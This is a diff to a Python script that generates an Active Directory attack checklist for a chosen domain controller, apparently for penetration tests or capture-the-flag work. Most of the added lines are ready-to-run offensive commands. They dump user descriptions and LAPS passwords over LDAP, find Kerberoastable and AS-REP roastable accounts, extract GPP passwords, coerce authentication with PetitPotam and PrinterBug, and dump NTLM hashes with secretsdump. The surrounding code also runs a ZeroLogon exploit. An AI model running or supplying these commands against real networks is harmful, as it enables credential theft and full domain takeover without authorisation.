@@ -49,8 +49,8 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
 
         # RPC Enumeration
         f.write("# RPC Enumeration\n")
-        if user:
-            f.write(f"rpcclient -U \"{user}\" -N {target_ip}\n")
+        if has_creds:
+            f.write(f"rpcclient -U \"{user}%{password}\" {target_ip}\n")
         else:
             f.write(f"rpcclient -U \"\" -N {target_ip}\n")
         f.write("cat dirty.txt | cut -b 7-999 | rev | cut -b 14-99 | rev > users.txt\n\n")
@@ -90,6 +90,32 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
         base_dn = ",".join(f"dc={part}" for part in domain.split("."))
         f.write(f"ldapsearch -x -H ldap://{target_ip} -b \"{base_dn}\" | grep 'userPrincipalName' | tr '@' ' ' | awk '{{print $2}}' > users.txt\n\n")
 
+        # Authenticated LDAP enumeration
+        if has_creds:
+            f.write("# Authenticated LDAP Enumeration\n")
+            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\"\n\n")
+
+            f.write("# LDAP - Dump all users with descriptions (password hints often hiding here)\n")
+            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\" '(objectClass=user)' sAMAccountName description | grep -E 'sAMAccountName|description' | paste - -\n\n")
+
+            f.write("# LDAP - Find accounts with SPNs set (Kerberoastable)\n")
+            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\" '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName\n\n")
+
+            f.write("# LDAP - Find accounts that don't require Kerberos pre-auth (AS-REP roastable)\n")
+            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\" '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' sAMAccountName\n\n")
+
+            f.write("# LDAP - Enumerate domain admins\n")
+            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\" '(memberOf=CN=Domain Admins,CN=Users,{base_dn})' sAMAccountName\n\n")
+
+            f.write("# LDAP - Find disabled accounts\n")
+            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\" '(userAccountControl:1.2.840.113556.1.4.803:=2)' sAMAccountName\n\n")
+
+            f.write("# LDAP - Find computers in the domain\n")
+            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\" '(objectClass=computer)' name operatingSystem\n\n")
+
+            f.write("# LDAP - Check for LAPS (Local Admin Password Solution)\n")
+            f.write(f"ldapsearch -x -H ldap://{target_ip} -D '{user}@{domain}' -w '{password}' -b \"{base_dn}\" '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd ms-Mcs-AdmPwdExpirationTime sAMAccountName\n\n")
+
         # ZeroLogon check
         f.write("# ZeroLogon Check\n")
         f.write(f"sudo python ~/tools/CVE-2020-1472-master/cve-2020-1472-exploit.py {hostname} {target_ip}\n\n")
@@ -105,6 +131,30 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
             f.write(f"getTGT.py {domain}/{user}:'{password}'\n")
             f.write(f"export KRB5CCNAME=./{user}.ccache\n")
             f.write(f"powerview {domain}/{user}@{target_ip} -k --no-pass --dc-ip {target_ip}\n\n")
+
+        # Delegation enumeration
+        if has_creds:
+            f.write("# Delegation Enumeration (unconstrained, constrained, RBCD)\n")
+            f.write(f"findDelegation.py {domain}/{user}:'{password}' -dc-ip {target_ip}\n\n")
+
+        # GPP Passwords
+        if has_creds:
+            f.write("# GPP Passwords (Group Policy Preferences)\n")
+            f.write(f"Get-GPPPassword.py {domain}/{user}:'{password}' -dc-ip {target_ip}\n\n")
+
+        # Coercion checks
+        if has_creds and local_ip:
+            f.write("# Coercion Checks - PetitPotam\n")
+            f.write(f"python3 PetitPotam.py {local_ip} {target_ip}\n")
+            f.write(f"python3 PetitPotam.py -u {user} -p '{password}' -d {domain} {local_ip} {target_ip}\n\n")
+            f.write("# Coercion Checks - PrinterBug / Dementor\n")
+            f.write(f"python3 dementor.py {local_ip} {target_ip} -u {user} -p '{password}' -d {domain}\n\n")
+
+        # Secretsdump
+        if has_creds:
+            f.write("# Secretsdump (requires admin creds)\n")
+            f.write(f"secretsdump.py {domain}/{user}:'{password}'@{target_ip}\n")
+            f.write(f"secretsdump.py {domain}/{user}:'{password}'@{target_ip} -just-dc-ntlm\n\n")
 
         # Password spraying after creds known
         if has_creds:
@@ -143,9 +193,14 @@ def create_ad_enumeration_file(target_ip, hostname, domain, local_ip, user, pass
             f.write(f"certipy find -scheme ldap -u {user}@{domain} -p '{password}' -target {hostname}.{domain} -dc-ip {target_ip} -vulnerable -stdout\n\n")
 
         # Try MSSQL
-        f.write("# Try to connect to MSSQL\n")
-        f.write("# Try with or without -windows-auth\n")
-        f.write(f"mssqlclient.py {domain}/sql_svc@{target_ip} -windows-auth\n\n")
+        if has_creds:
+            f.write("# MSSQL connection - try with and without -windows-auth\n")
+            f.write(f"mssqlclient.py {domain}/{user}:'{password}'@{target_ip} -windows-auth\n")
+            f.write(f"mssqlclient.py {domain}/{user}:'{password}'@{target_ip}\n\n")
+
+            f.write("# MSSQL enum via netexec\n")
+            f.write(f"netexec mssql {target_ip} -u {user} -p '{password}' -q 'SELECT name FROM master.dbo.sysdatabases;'\n")
+            f.write(f"netexec mssql {target_ip} -u {user} -p '{password}' -q 'SELECT IS_SRVROLEMEMBER(''sysadmin'');'\n\n")
 
     print("output.txt file generated successfully.")
 
